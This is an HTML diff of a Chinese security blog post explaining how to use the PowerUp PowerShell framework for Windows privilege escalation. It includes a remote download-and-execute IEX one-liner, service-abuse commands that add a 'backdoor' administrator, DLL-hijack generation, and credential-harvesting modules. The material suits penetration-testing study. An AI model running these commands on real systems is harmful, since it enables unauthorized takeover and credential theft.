@@ -1,0 +1,1719 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+
+
+
+
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=6.7.0">
+
+
+
+
+
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "198a1f28"
+    });
+  daovoice('update');
+  </script>
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    fastclick: true,
+    lazyload: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="通常，在Windows下面我们可以通过内核漏洞来提升权限，但是，我们常常会碰到所处服务器通过内核漏洞提权是行不通的，这个时候，我们就需要通过脆弱的Windows服务提权，比如我们替换掉服务所依赖的DLL文件，当服务重启时，加载我们替换的DLL文件从而完成比如添加管理员账号的操作。或者通过常见的Mssql，Mysql等服务，通过其继承的系统权限来完成提权等等，而今天我将介绍一个非常实用的Powers">
+<meta name="keywords" content="Powershell,powerup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Powrshell 提权框架-Powerup">
+<meta property="og:url" content="https://evi1cg.github.io/archives/Powerup.html">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
+<meta property="og:description" content="通常，在Windows下面我们可以通过内核漏洞来提升权限，但是，我们常常会碰到所处服务器通过内核漏洞提权是行不通的，这个时候，我们就需要通过脆弱的Windows服务提权，比如我们替换掉服务所依赖的DLL文件，当服务重启时，加载我们替换的DLL文件从而完成比如添加管理员账号的操作。或者通过常见的Mssql，Mysql等服务，通过其继承的系统权限来完成提权等等，而今天我将介绍一个非常实用的Powers">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/2950702826.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/218440686.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/1762867121.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/1860090830.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/963279761.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/991058837.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/1562735981.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/3724311652.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/1878968638.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/851829458.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/1897269880.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/2301472208.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/1920271330.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/1190301204.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/3237295859.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/01/1008699184.png">
+<meta property="og:updated_time" content="2019-01-15T05:43:36.771Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Powrshell 提权框架-Powerup">
+<meta name="twitter:description" content="通常，在Windows下面我们可以通过内核漏洞来提升权限，但是，我们常常会碰到所处服务器通过内核漏洞提权是行不通的，这个时候，我们就需要通过脆弱的Windows服务提权，比如我们替换掉服务所依赖的DLL文件，当服务重启时，加载我们替换的DLL文件从而完成比如添加管理员账号的操作。或者通过常见的Mssql，Mysql等服务，通过其继承的系统权限来完成提权等等，而今天我将介绍一个非常实用的Powers">
+<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2016/01/2950702826.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Evi1cg's blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://evi1cg.github.io/archives/Powerup.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Powrshell 提权框架-Powerup | Evi1cg's blog</title>
+  
+
+
+
+
+  <script async src="//www.googletagmanager.com/gtag/js?id=UA-132188022-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-132188022-1');
+  </script>
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <script type="text/javascript" src="/js/src/love.js"></script>
+</head>
+
+<body itemscope="" itemtype="https://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="https://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Evi1cg's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-归档 menu-item-active">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archive" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-工具">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools" rel="section"><i class="menu-item-icon fa fa-fw fa-briefcase"></i> <br>工具</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-友链">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/friends" rel="section"><i class="menu-item-icon fa fa-fw fa-link"></i> <br>友链</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="https://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/Powerup.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+      <meta itemprop="name" content="Evi1cg">
+      <meta itemprop="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
+      <meta itemprop="name" content="Evi1cg's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Powrshell 提权框架-Powerup
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2016-01-19 05:20:00" itemprop="dateCreated datePublished" datetime="2016-01-19T05:20:00+08:00">2016-01-19</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing"><a href="/categories/渗透案例/" itemprop="url" rel="index"><span itemprop="name">渗透案例</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <a href="/archives/Powerup.html#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/archives/Powerup.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>通常，在Windows下面我们可以通过内核漏洞来提升权限，但是，我们常常会碰到所处服务器通过内核漏洞提权是行不通的，这个时候，我们就需要通过脆弱的Windows服务提权，比如我们替换掉服务所依赖的DLL文件，当服务重启时，加载我们替换的DLL文件从而完成比如添加管理员账号的操作。或者通过常见的Mssql，Mysql等服务，通过其继承的系统权限来完成提权等等，而今天我将介绍一个非常实用的Powershell框架-Powerup，此框架可以在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。</p>
+<a id="more"></a>
+<h2 id="0x00-使用"><a href="#0x00-使用" class="headerlink" title="0x00 使用"></a>0x00 使用</h2><p>要使用Powerup，首先需要下载此脚本:<a href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1" target="_blank" rel="noopener">Powerup</a>，之后加载此脚本：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">E</span>:&gt; powershell.exe -nop -exec bypass</span><br><span class="line">PS <span class="keyword">E</span>:\&gt; <span class="keyword">Import</span>-<span class="keyword">Module</span> .\PowerUp.psm1</span><br></pre></td></tr></table></figure></p>
+<p>加载完成以后，便可以使用Powerup中的所有模块了。<br>通过如下命令可以查看所有模块：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">E</span>:\&gt; <span class="keyword">Get</span>-Command -<span class="keyword">Module</span> powerup</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/2950702826.png" alt="1452132812840.png"></p>
+<p>输入可以通过tab键来自动补全，如果要查看各个模块的详细说明，可以使用”<code>Get-help [cmdlet] -full</code>“来查看，比如”<code>Get-Help Find-DLLHijack -full</code>“，<br>如果要将输出的结果导出到一个文件可以使用<code>Out-File</code>，如下：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">E</span>:\&gt; Invoke-AllChecks | <span class="keyword">Out</span>-<span class="keyword">File</span> -Encoding ASCII checks.txt</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>上述命令使用了Invoke-AllChecks，脚本将会进行所有的检查</p>
+</blockquote>
+<p>在cmd环境下，可以使用下列方式来运行该脚本：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt; powershell<span class="selector-class">.exe</span> -exec bypass -Command <span class="string">"&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;"</span></span><br></pre></td></tr></table></figure></p>
+<p>如果你想在内存加载此脚本，可以用下列方式：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt; powershell -<span class="keyword">nop </span>-exec <span class="keyword">bypass </span>-c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://dwz.cn/2vkbfP'); Invoke-AllChecks"</span></span><br></pre></td></tr></table></figure></p>
+<p>除此之外，Metasploit上同样包含执行powershell脚本的模块<a href="https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/post/windows/manage/powershell/exec_powershell.rb" target="_blank" rel="noopener">exec_powershell.rb</a>，通过此模块，可以通过msf会话来执行powershell。</p>
+<h2 id="0x01-模块介绍"><a href="#0x01-模块介绍" class="headerlink" title="0x01 模块介绍"></a>0x01 模块介绍</h2><p><strong>Find-DLLHijack</strong><br>检查每个进程所加载的模块，返回已经加载且不在其可执行目录的模块的目录。<br>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Find</span>-DLLHijack #返回所有的dll路径</span><br><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Find</span>-DLLHijack -ExcludeWindows -ExcludeProgramFiles #返回排除<span class="keyword">C</span>:\Windows\*； <span class="keyword">C</span>:\Program Files\*；<span class="keyword">C</span>:\Program Files (x86)\*以外的dll路径</span><br><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Find</span>-DLLHijack -ExcludeOwned #返回不属于当前用户所有进程权限的dll路径</span><br></pre></td></tr></table></figure></p>
+<p><strong>Find-PathHijack</strong><br>检查当前%PATH%是否存在哪些目录是当前用户可以写入的。<br>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Find</span>-PathHijack</span><br></pre></td></tr></table></figure></p>
+<p><strong>Get-ApplicationHost</strong><br>从系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码。<br>执行方式：<br><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">PS </span>C:\&gt;<span class="built_in">get-ApplicationHost</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt;<span class="built_in">get-ApplicationHost</span> | <span class="string">Format-Table </span>-<span class="string">Autosize </span><span class="comment"># 列表显示</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>Get-ModifiableFile</strong><br>检查某个文件当前用户是否拥有修改权限，并返回有权限的文件路径。<br>执行方式：<br><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; <span class="string">'"</span>E:\temp\<span class="number">123123.</span>xlsx<span class="string">" -f "</span>C:\LibAntiPrtSc_ERROR.<span class="built_in">log</span><span class="string">"'</span> | Get-ModifiableFile</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>前面为文件路径</p>
+</blockquote>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/218440686.png" alt="1452140109534.png"></p>
+<p><strong>Get-RegAlwaysInstallElevated</strong><br>检查AlwaysInstallElevated注册表项是否被设置，如果被设置，意味着的MSI文件是以system权限运行的。<br>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Get</span>-RegAlwaysInstallElevated</span><br></pre></td></tr></table></figure></p>
+<p><strong>Get-RegAutoLogon</strong><br>检测Winlogin注册表AutoAdminLogon项有没有被设置，可查询默认的用户名和密码。与msf <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb" target="_blank" rel="noopener">windows_autologin.rb</a>模块相同。<br>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Get</span>-RegAutoLogon</span><br></pre></td></tr></table></figure></p>
+<p><strong>Get-ServiceDetail</strong><br>返回某服务的信息。<br>执行方式：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="string">\&gt;</span> Get-ServiceDetail -ServiceName Dhcp <span class="comment">#获取DHCP服务的详细信息</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/1762867121.png" alt="1452139905476.png"></p>
+<p><strong>Get-ServiceFilePermission</strong><br>检查当前用户能够在哪些服务的目录写入相关联的可执行文件，通过这些文件可达到提权的目的。<br>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Get</span>-ServiceFilePermission</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/1860090830.png" alt="1452140228913.png"></p>
+<p><strong>Get-ServicePermission</strong><br>检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象。<br>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Get</span>-ServicePermission</span><br></pre></td></tr></table></figure></p>
+<p><strong>Get-ServiceUnquoted</strong><br>检查服务路径，返回包含空格但是不带引号的服务路径，类似于msf的<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb" target="_blank" rel="noopener">trusted_service_path.rb</a>。<br>此处利用的windows的一个逻辑漏洞，即当文件包含空格时，windows API会解释为两个路径，并将这两个文件同时执行，有些时候可能会造成权限的提升。</p>
+<blockquote>
+<p>比如<code>C:\program files\hello.exe</code>,会被解释为<code>C:\program.exe</code>以及<code>C:\program files\hello.exe</code></p>
+</blockquote>
+<p>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt;<span class="keyword">Get</span>-ServiceUnquoted</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/963279761.png" alt="1452140376078.png"></p>
+<p><strong>Get-UnattendedInstallFile</strong><br>检查几个路径，查找是否存在这些文件，在这些文件里可能包含有部署凭据。这些文件包括：</p>
+<ul>
+<li>c:\sysprep\sysprep.xml</li>
+<li>c:\sysprep\sysprep.inf</li>
+<li>c:\sysprep.inf</li>
+<li>c:\windows\Panther\Unattended.xml</li>
+<li>c:\windows\Panther\Unattend\Unattended.xml</li>
+<li>c:\windows\Panther\Unattend.xml</li>
+<li>c:\windows\Panther\Unattend\Unattend.xml</li>
+<li>c:\windows\System32\Sysprep\unattend.xml</li>
+<li>c:\windows\System32\Sysprep\Panther\unattend.xml</li>
+</ul>
+<p>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Get</span>-UnattendedInstallFile</span><br></pre></td></tr></table></figure></p>
+<p><strong>Get-VulnAutoRun</strong><br>检查开机自启的应用程序路径和注册表键值，返回当前用户可修改的程序路径。<br>注册表检查的键值为：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</span><br><span class="line">HKLM<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnce</span><br><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\W</span>ow6432Node<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</span><br><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\W</span>ow6432Node<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnce</span><br><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unService</span><br><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnceService</span><br><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\W</span>ow6432Node<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unService</span><br><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\W</span>ow6432Node<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnceService</span><br></pre></td></tr></table></figure></p>
+<p>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Get</span>-VulnAutoRun</span><br></pre></td></tr></table></figure></p>
+<p><strong>Get-VulnSchTask</strong><br>返回当前用户能够修改的计划任务程序的名称和路径。<br>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Get</span>-VulnSchTask</span><br></pre></td></tr></table></figure></p>
+<p><strong>Get-Webconfig</strong><br>返回当前服务器上的web.config文件中的数据库连接字符串的明文。<br>执行方式：<br><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">PS </span>C:\&gt;<span class="built_in">get-webconfig</span>  </span><br><span class="line"><span class="string">PS </span>C:\&gt;<span class="built_in">get-webconfig</span> | <span class="string">Format-Table </span>-<span class="string">Autosize </span><span class="comment">#列表显示</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>Invoke-AllChecks</strong><br>执行所有的脚本来检查。<br>执行方式：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="string">C:</span>\&gt; Invoke-AllChecks</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/991058837.png" alt="1452141381968.png"></p>
+<p><strong>Invoke-Service</strong></p>
+<ul>
+<li>Invoke-ServiceDisable 禁用服务</li>
+<li>Invoke-ServiceEnable 启用服务</li>
+<li>Invoke-ServiceStart 启动服务</li>
+<li>Invoke-ServiceStop 停止服务</li>
+</ul>
+<p>执行方式为：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="string">C:</span>\&gt; Invoke-ServiceDisable -ServiceName 服务名称。</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>Invoke-ServiceAbuse<br>用来通过修改服务添加用户到指定组，并可以通过定制-cmd参数触发添加用户的自定义命令。<br>执行方式:<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="string">\&gt;</span> Invoke-ServiceAbuse -ServiceName VulnSVC <span class="comment"># 添加默认账号</span></span><br><span class="line">PS C:<span class="string">\&gt;</span> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName <span class="string">"TESTLAB\john"</span> <span class="comment"># 指定添加域账号</span></span><br><span class="line">PS C:<span class="string">\&gt;</span> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup <span class="string">"Administrators"</span> <span class="comment"># 指定添加用户，用户密码以及添加的用户组。</span></span><br><span class="line">PS C:<span class="string">\&gt;</span> Invoke-ServiceAbuse -ServiceName VulnSVC -Command <span class="string">"net ..."</span> <span class="comment"># 自定义执行命令</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>默认的账号可以通过修改默认参数来修改，如下图：<br><img src="https://evi1cg.github.io/usr/uploads/2016/01/1562735981.png" alt="1452142652155.png"></p>
+<p><strong>Restore-ServiceBinary</strong><br>恢复服务的可执行文件到原始目录。<br>执行方式：<br><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; <span class="built_in">Restore</span>-ServiceBinary -ServiceName VulnSVC</span><br></pre></td></tr></table></figure></p>
+<p><strong>Test-ServiceDaclPermission</strong><br> 检查某个用户是否在一个服务有自由访问控制的权限，返回true或false。<br>执行方式：<br><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; <span class="built_in">Restore</span>-ServiceBinary -ServiceName VulnSVC</span><br></pre></td></tr></table></figure></p>
+<p><strong>Write-HijackDll</strong><br>输出一个自定义命令并且能够自删除的bat文件到$env:Temp\debug.bat，并输出一个能够启动这个bat文件的dll。<br>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Write</span>-HijackDll -OutputFile <span class="string">'E:\temp\test.dll'</span> -Command <span class="string">'whoami'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/3724311652.png" alt="1452143240814.png"></p>
